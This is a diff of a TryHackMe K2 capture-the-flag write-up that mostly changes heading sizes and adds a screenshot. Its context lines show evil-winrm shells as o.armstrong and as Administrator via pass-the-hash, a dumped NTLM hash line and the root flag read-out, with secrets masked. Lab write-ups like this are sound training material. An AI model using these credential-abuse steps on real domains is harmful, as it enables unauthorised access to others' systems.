@@ -178,7 +178,7 @@ j.smith
 2025/09/30 xx:xx:xx >  [+] VALID USERNAME:	 j.smith@k2.thm
 ```
 
-<h3 align="center">Shell as <strong>j.smith</strong></h3>
+<h1 align="center">Shell as <strong>j.smith</strong></h1>
 <p align="center">The hash identified for Administrator in Task 2 (••••••••••••••••••••••••••••••••) allowed to obtain shell.</p>
 
 <br>
@@ -450,11 +450,7 @@ PS C:\Windows\system32> dir \\xx.xxx.xxx.xxx\test\
 ⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃      (o.armstrong)
 ```
 
-<br>
-<br>
-<br>
-
-<h3 align="center">Shell as <strong>o.armstrong</strong></h3>
+<h1 align="center">Shell as <strong>o.armstrong</strong></h1>
 
 ```bash
 :~/K2# evil-winrm -i K2RootDC.k2.thm -u 'o.armstrong' -p '⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃'
@@ -580,7 +576,7 @@ RESEARCHER$:1119:aad3b435b51404eeaad3b435b51404ee:⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃
 [*] Cleaning up... 
 ```
 
-<h3 align="center">Shell as <strong>Administrator</strong></h3>
+<h1 align="center">Shell as <strong>Administrator</strong></h1>
 
 ```bash
 :~/K2# evil-winrm -i K2RootDC.k2.thm -u 'administrator' -H '⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆'
@@ -647,6 +643,11 @@ Mode                LastWriteTime         Length Name
 *Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
 THM{********************************}
 ```
+
+<img width="1918" height="514" alt="{FD31DDD6-0133-4AC8-A853-FD534C2332F9}" src="https://github.com/user-attachments/assets/824d6910-1bc5-410a-8611-74177bfb2bb5" />
+
+<br>
+<br>
 
 <p>3.2. What is the root flag?<br>
 <code>THM{********************************}</code></p>
